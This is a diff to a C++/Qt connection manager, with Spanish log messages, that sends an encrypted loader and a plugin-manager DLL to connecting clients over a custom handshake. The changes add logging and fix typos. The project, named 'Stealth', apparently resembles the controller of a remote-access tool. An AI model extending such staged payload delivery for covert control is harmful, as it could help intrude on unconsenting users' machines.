@@ -9,14 +9,14 @@ ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage
     connect(this,SIGNAL(connectionReady(Connection*)),this,SLOT(addConnection(Connection*)));
     connect(mngMessage,SIGNAL(receivedHandshake(Connection*)),this,SLOT(processHandshake(Connection*)));
     connect(mngMessage,SIGNAL(receivedLoaderOk(Connection*)),this,SLOT(sendPluginManager(Connection*)));
-    connect(mngMessage,SIGNAL(receivedHanshakeOk(Connection*)),this,SLOT(checkHandshakeOk(Connection*)));
+    connect(mngMessage,SIGNAL(receivedHandshakeOk(Connection*)),this,SLOT(checkHandshakeOk(Connection*)));
 }
 
 void ConnectionManager::sendLoader(Connection *connection)
 {
     if(connection->getState()==Connection::JustConnected)
     {
-        qDebug("Enviando loader");
+        qDebug("Enviando \"loader.bin\"");
 
         connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
         connect(connection,SIGNAL(timeout()),this,SLOT(connection_timeout()));
@@ -47,13 +47,15 @@ void ConnectionManager::sendLoader(Connection *connection)
 
         connection->write(connection->getIV()+crypted);
 
+        qDebug()<<"\"loader.bin\" enviado";
+
         connection->setState(Connection::WaitingForLoader);
     }
 }
 
 void ConnectionManager::sendPluginManager(Connection *connection)
 {
-    qDebug("Enviando pluginmanager");
+    qDebug("Enviando \"pluginmanager.dll\"");
 
     QFile filePluginLoader("pluginmanager.dll");
     if(!filePluginLoader.open(QIODevice::ReadOnly))
@@ -81,12 +83,14 @@ void ConnectionManager::sendPluginManager(Connection *connection)
     crypted.insert(0,(char*)&pluginManagerSize,4);
     connection->write(crypted);
 
+    qDebug()<<"\"pluginmanager.dll\" enviado";
+
     connection->setState(Connection::WaitingForGreeting);
 }
 
 void ConnectionManager::processHandshake(Connection* connection)
 {
-    //FIXME: Reestablecer a WaitingForGreeting?
+    qDebug()<<"Procesando Handshake";
     if(connection->getState()!=Connection::ReadingGreeting) return;
     if(connection->Data.size()!=connection->NextBlockHeader.Size.Bytes) return;
 
@@ -99,6 +103,10 @@ void ConnectionManager::processHandshake(Connection* connection)
         qWarning("ClientHandShake.MaxBlockSize inválido");
         return;
     }
+
+    qDebug()<<"Handshake aceptado";
+
+    qDebug()<<"Construyendo handshake de respuesta";
 
     Connection::RPEP_CLIENT_HANDSHAKE* ClientHandShake;
 
@@ -113,11 +121,6 @@ void ConnectionManager::processHandshake(Connection* connection)
     ClientHandShake->PortCount=NUM_PORTS;
     ClientHandShake->Version.High=1;
     ClientHandShake->Version.Low=0;
-
-    if(ClientHandShake->MaxBlockSize==0)
-    {
-        qWarning()<<"ClientHandShake->MaxBlockSize==0";
-    }
 
     Connection::RPEP_HEADER::_OperationType* opType=(Connection::RPEP_HEADER::_OperationType*)malloc(sizeof(Connection::RPEP_HEADER::_OperationType));
     opType->bOperation=true;
@@ -141,6 +144,7 @@ void ConnectionManager::processHandshake(Connection* connection)
 
 void ConnectionManager::checkHandshakeOk(Connection* connection)
 {
+    qDebug("Comprobando confirmación de handshake");
     if(connection->getState()!=Connection::ReadingGreetingOk) return;
     if(connection->Data.size()!=connection->NextBlockHeader.Size.Bytes) return;
 
@@ -153,13 +157,15 @@ void ConnectionManager::checkHandshakeOk(Connection* connection)
     }
     else if(ok.Code==0xFFFF)
     {
-        qWarning()<<"Confirmación de Hanshake errónea, el pluginmanager no soporta el handshake enviado";
+        qWarning()<<"Confirmación de Handshake errónea, el pluginmanager no soporta el handshake enviado";
         return;
     }
 
-    qDebug()<<"Confirmación Hanshake correcto, conexión lista";
+    qDebug()<<"Confirmación handshake correcta";
 
     connection->setID(connectionIndex++);
+
+    qDebug()<<"Conexión #"+QString::number(connection->getID())+" lista";
 
     connection->setState(Connection::Ready);
     emit connectionReady(connection);
@@ -182,10 +188,9 @@ Connection* ConnectionManager::connection(int ID)
 
 void ConnectionManager::connection_timeout()
 {
-
-    qWarning()<<"Conexión ausente";
-
     Connection* connection=qobject_cast<Connection*>(sender());
+
+    qWarning()<<"Conexión #"+QString::number(connection->getID())+" ausente";
 
     emit connectionDeleted(connection->getID());
 
@@ -194,10 +199,9 @@ void ConnectionManager::connection_timeout()
 
 void ConnectionManager::connectionError(QAbstractSocket::SocketError)
 {
-    /* TODO: Hacer que si hay un error en la conexión cuando la conexión ya
-             está añadida a la GUI, se elimine el item del TreeView */
-
     Connection* connection=qobject_cast<Connection*>(sender());
+
+    qWarning()<<"Error en conexión #"+QString::number(connection->getID());
 
     emit connectionDeleted(connection->getID());
 
@@ -206,9 +210,9 @@ void ConnectionManager::connectionError(QAbstractSocket::SocketError)
 
 void ConnectionManager::connection_disconnected()
 {
-    qWarning("Conexión perdida");
-
     Connection* connection=qobject_cast<Connection*>(sender());
+
+    qWarning()<<"Conexión #"+QString::number(connection->getID())+" perdida";
 
     emit connectionDeleted(connection->getID());
 
